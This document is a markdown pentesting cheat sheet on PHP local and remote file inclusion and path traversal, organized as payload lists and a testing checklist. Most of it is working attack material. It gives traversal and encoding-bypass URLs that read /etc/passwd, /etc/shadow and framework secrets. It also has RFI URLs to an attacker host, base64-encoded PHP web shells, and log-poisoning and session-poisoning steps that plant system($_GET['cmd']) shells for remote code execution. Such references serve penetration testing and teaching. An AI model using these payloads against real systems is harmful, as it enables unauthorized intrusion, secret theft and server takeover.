# File Inclusion
* **`Remote File Inclusion (RFI)`**: The file is loaded from a remote server (Best: You can write the code and the server will execute it). In php this is disabled by default (allow_url_include).
* **`Local File Inclusion (LFI)`**: The sever loads a local file.

**Vulnerable PHP functions:**
* `require`
* `require_once`
* `include`
* `include_once`


## Basic LFI
In the following examples we include the `/etc/passwd` file, check the **`Directory & Path Traversal`** chapter for more interesting files.
```html
http://example.com/index.php?page=../../../etc/passwd
```
traversal sequences stripped non-recursively
```html
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### Null byte (%00)
Bypass the append more chars at the end of the provided string (bypass of: `$_GET['param']."php"`)
```html
http://example.com/index.php?page=../../../etc/passwd%00
```
This is solved since **PHP 5.4**

### Encoding
```html
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

### From existent folder
Maybe the back-end is checking the folder path:
```html
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Identifying folders on a server
* identify the "depth" of you current directory by succesfully retrieving `/etc/passwd` (if on Linux):
```html
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
* try and guess the name of a folder in the current directory by adding the folder name (here, private), and then going back to `/etc/passwd`:
```html
http://example.com/index.php?page=private/../../../../etc/passwd # we went deeper down one level, so we have to go 3+1=4 levels up to go back to /etc/passwd 
```
* if the application is **vulnerable**, there might be two different outcomes to the request:
  1. if you get an `error / no output`, the private folder does not exist at this location
  2. if you get the content from `/etc/passwd`, you validated that there is indeed a privatefolder in your current directory

 you want to check if `/var/www/` contains a private directory, use the following payload:
 ```html
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
The following sequence of commands allows the generation of payloads using sed (1) as input for url fuzzing tools such as ffuf (2):
```bash
# 1
sed 's_^_../../../var/www/_g' /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt | sed 's_$_/../../../etc/passwd_g' > payloads.txt

# 2
ffuf -u http://example.com/index.php?page=FUZZ -w payloads.txt -mr "root"
```

### Path truncation
Bypass the append of more chars at the end of the provided string (bypass of: `$_GET['param']."php"`)
```html
In PHP: /etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.
Check if last 6 chars are passwd --> passwd/
Check if last 4 chars are ".php" --> shellcode.php/.
```

```html
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.

#With the next options, by trial and error, you have to discover how many "../" are needed to delete the appended string but not "/etc/passwd" (near 2027)

http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
> Always try to start the path with a fake directory (a/).
> 
> **This vulnerability was corrected in PHP 5.3**

### Filter bypass tricks
```html
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```

## Remote File Inclusion
In **php** this is disable by default because `allow_url_include` is **Off**. It must be On for it to work, and in that case you could include a PHP file from your server and get RCE:
```html
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
If for some reason `allow_url_include` is **On**, but PHP is filtering access to external webpages, [according to this post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), you could use for example the data protocol with base64 to decode a b64 PHP code and egt RCE:
```html
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
Another example not using the **`php://`** protocol would be:
```html
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```

## Python Root element
In python in a code like this one:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
If the user passes an absolute path to `file_name`, the previous path is just removed:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```

### Top 25 parameters
Here’s list of top 25 parameters that could be vulnerable to local file inclusion (LFI)
```html
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```

## LFI / RFI using PHP wrappers & protocols
### php://filter
PHP filters allow perform basic modification operations on the data before being it's read or written. There are 5 categories of filters:
1. **String Filters**:
  * `string.rot13`
  * `string.toupper`
  * `string.tolower`
  * `string.strip_tags`: Remove tags from the data (everything between `"<"` and `">"` chars)
    > Note that this filter has disappear from the modern versions of PHP
2.  **Conversion Filters**
  * `convert.base64-encode`
  * `convert.base64-decode`
  * `convert.quoted-printable-encode`
  * `convert.quoted-printable-decode`
  * `convert.iconv.*` : Transforms to a different encoding(`convert.iconv.<input_enc>.<output_enc>`) . To get the list of all the encodings supported run in the console: `iconv -l`
3. **Compression Filters**
  * `zlib.deflate`: Compress the content (useful if exfiltrating a lot of info)
  * `zlib.inflate`: Decompress the data
4. **Encryption Filters**
  * `mcrypt.*` : Deprecated
  * `mdecrypt.*` : Deprecated
5. **Other Filters**

Running in php `var_dump(stream_get_filters());` you can find a couple of unexpected filters:
  * `consumed`
  * `dechunk`: reverses HTTP chunked encoding
  * `convert.*`

```bash
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```

### Via Email
Send a mail to a internal account (`user@localhost`) containing your PHP payload like `<?php echo system($_REQUEST["cmd"]); ?>` and try to include to the mail of the user with a path like `/var/mail/<USERNAME>` or `/var/spool/mail/<USERNAME>`

### Via upload
If you can upload a file, just inject the shell payload in it (e.g : <?php system($_GET['c']); ?> ).
```html
http://example.com/index.php?page=path/to/uploaded/file.png
```
In order to keep the file readable it is best to inject into the metadata of the pictures/doc/pdf

### RCE via Mail
First send an email using the open SMTP then include the log file located at http://example.com/index.php?page=/var/log/mail.
```bash
root@kali:~# telnet 10.10.10.10. 25
Trying 10.10.10.10....
Connected to 10.10.10.10..
Escape character is '^]'.
220 straylight ESMTP Postfix (Debian/GNU)
helo ok
250 straylight
mail from: mail@example.com
250 2.1.0 Ok
rcpt to: root
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: <?php echo system($_GET["cmd"]); ?>
data2
.
```
In some cases you can also send the email with the mail command line.
```bash
mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
```
### RCE via Apache logs
Poison the User-Agent in access logs:
```bash
curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
```
> Note: The logs will escape double quotes so use single quotes for strings in the PHP payload.

Then request the logs via the LFI and execute your command.
```bash
curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
```


### LFI to RCE via PHP sessions
Check if the website use PHP Session (`PHPSESSID`)
```html
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
In PHP these sessions are stored into `/var/lib/php5/sess_[PHPSESSID]` or `/var/lib/php/sessions/sess_[PHPSESSID]` files
```html
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Set the cookie to `<?php system(`'cat /etc/passwd');?`>`
```html
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Use the LFI to include the PHP session file
```html
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
```


## Path Traversal Testing Checklist

### 1. Basic Path Traversal Testing
* Identify vulnerable parameters:
* Look for parameters like `filename`, `path`, `dir`, `doc`, `file`, `img`.
  * Example:
    * `https://target.com/loadImage?filename=../../../etc/passwd`
    * `https://target.com/loadFile?file=..\..\..\windows\win.ini`
### 2. Bypassing Basic Defenses
* Using Absolute Paths:

  * Linux: `filename=/etc/passwd`
  * Windows: `filename=C:\windows\win.ini`
    
* Using Nested Traversal Sequences:

  * Variations: `....//`, `....\\`, `....\/` to bypass non-recursive filtering.
    
* URL Encoding & Double Encoding:

  * `%2e%2e%2f` (`../` encoded)
  * `%252e%252e%252f` (double-encoded `../`)
  * Other encodings: `..%c0%af`, `..%ef%bc%8f`
    
* Appending Required Paths to Bypass Filtering:

  * Example: `filename=/var/www/images/../../../etc/passwd`

* Bypassing Extension Restrictions with Null Byte:

  * `filename=../../../etc/passwd%00.png`
    
### 3. Advanced Path Traversal Testing

* Bypassing with Alternate Encodings:

  * Unicode encodings like `%u2215` (`/` alternative) or mixed encoding techniques.
    
* Testing in Different Request Methods:

  * `GET`, `POST`, `PUT`, `DELETE`.

  * Example: `POST /loadImage HTTP/1.1` with body `{ "filename": "../../../etc/passwd" }`

* Testing API Endpoints:

  * Example: `https://api.target.com/v1/files?path=../../../etc/shadow`
    
* Checking for Cloud Storage and Virtual Filesystems:

  * Try accessing `/proc/self/environ`, `/proc/self/cmdline` for containerized environments.
  * Example: `filename=/proc/self/cmdline`
    
* Testing Path Traversal in Common CMS and Frameworks:

  * WordPress: `https://target.com/wp-content/plugins/example-plugin/download.php?file=../../../wp-config.php`
  * Laravel: `https://target.com/storage/logs/../../../.env`
  * Django: `https://target.com/media/../../../settings.py`
  * Magento: `https://target.com/app/etc/../../../env.php`
  * Spring Boot (Java): `https://target.com/actuator/../../../application.properties`

* Checking for Misconfigured File Inclusion Paths:

  * PHP: `?file=php://filter/convert.base64-encode/resource=../../../etc/passwd`
  * Node.js: `?file=/app/node_modules/../../../etc/passwd`
  * Java: `?file=/WEB-INF/web.xml`

* Using Log File Disclosure for Enumeration:

  * Example: `filename=../../../var/log/apache2/access.log`
  * Example: `filename=../../../var/log/nginx/error.log`
  * Example: `filename=../../../../../../var/lib/docker/containers/*/*.log`

### 4. Advanced Path Traversal Exploitation Examples
* Example 1: Basic Path Traversal Attack
```html
Request:
GET /loadImage?filename=../../../etc/passwd HTTP/1.1

Response:
root:x:0:0:root:/root:/bin/bash
...
```
* Example 2: Bypassing Extension Restrictions
```html
Request:
GET /loadImage?filename=../../../etc/passwd%00.png HTTP/1.1

Response:
root:x:0:0:root:/root:/bin/bash
...
```
* Example 3: Using URL Encoding for Bypass
```html
Request:
GET /loadImage?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1

Response:
root:x:0:0:root:/root:/bin/bash
...
```
### 5. Recommended Areas for Testing Based on Backend Technology
### PHP:

* Check file handling functions like `include()`, `require()`, `file_get_contents()`.
* Check for vulnerabilities in file-based CMS (e.g., WordPress, Joomla).
  
### Node.js:

* Look for `fs.readFile()`, Express file handling routes.
* Check for misconfigurations in upload directories and file-serving APIs.

### Java (Spring Boot, JSP):

* Test endpoints using `@RequestParam` and `Servlets`.
* Look for issues in file handling via InputStream and file inclusion vulnerabilities.

### Python (Django, Flask):

* Check `open()`, `send_file()` usage.
* Look for misconfigurations in static file paths or file upload handlers.

### .NET (ASP.NET Core):

* Check for `System.IO` functions like `File.ReadAllText()`.
* Test routes involving file manipulation or user inputs controlling file paths.

### Ruby (Rails):

* Look for `File.read()` and `user-controlled` paths.
* Check for improper configuration in file serving or file uploads.

### 6. Testing Specific Advanced Scenarios
**1. Bypassing Input Validation and Encoding:**
* Bypassing Path Normalization Filters:
  * Some applications normalize input paths, so using combinations like `....%5c....%5c` or `....%2f....%2f` (obfuscated `../`) can bypass these filters.
* Advanced Encoding (Triple Encoding):
  * Triple encoding such as `..%252f..%252f..%252fetc%252fpasswd` can bypass more stringent filtering mechanisms.

**2. Bypassing Access Control for Restricted Directories:**
* Testing `.htaccess` and Web Configurations:
  * Many web servers (like Apache) use `.htaccess` for access control. Check if sensitive files like `.htpasswd`, `.htaccess` are accessible.

**3. Using Symlinks in Upload Directories and Public Folders:**
* Bypassing Upload Directory Restrictions via Symlinks:
  * If an app allows file uploads, create symbolic links that point to sensitive files.
  * Example: Create a symlink in an upload folder pointing to `/etc/passwd`.

**4. Testing Virtualization and Containerized Environments:**
* Docker and Kubernetes:
  * For containerized environments, test for vulnerabilities in paths like `/proc/self/environ` or `/proc/self/cmdline`.
  * Example: `filename=/proc/self/cmdline`

**5. Advanced File Inclusion Bypass:**
* PHP:

  * Use `php://filter` for base64 encoding to bypass file inclusion controls:
    * `file=php://filter/convert.base64-encode/resource=../../../etc/passwd`

* Node.js:

  * Attempt file access via protocols like `file://` or by manipulating routes:
    * `?file=file:///etc/passwd`

* Java (Spring Boot):

  * Test for File Inclusion using various paths:
    * `?file=classpath://../../WEB-INF/web.xml`

**6. Log File Exfiltration:**
* Using Path Traversal to Access Log Files:
  * Many systems store logs in files that can be accessed using traversal:
    * `filename=../../../var/log/apache2/access.log`



































